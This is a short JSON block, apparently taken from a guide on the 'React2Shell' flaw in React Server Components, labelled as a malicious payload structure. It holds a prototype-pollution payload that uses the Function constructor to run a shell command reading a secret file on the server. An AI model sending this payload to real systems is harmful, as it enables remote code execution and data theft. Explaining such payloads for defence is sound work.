@@ -1,0 +1,19 @@
+# Source: https://betterstack.com/community/guides/scaling-nodejs/react2shell_react_server/
+# Original language: json
+# Normalized: json
+# Block index: 7
+
+[label Malicious payload structure]
+{
+  "then": "$1:__proto__:then",
+  "status": "resolved_model",
+  "value": "{\"then\":\"*$B0\"}",
+[highlight]
+  "_response": {
+    "_prefix": "process.mainModule.require('child_process').execSync('cat ~/Desktop/secret.txt').toString()",
+    "_formData": {
+      "get": "$1:constructor:constructor"
+    }
+  }
+[/highlight]
+}
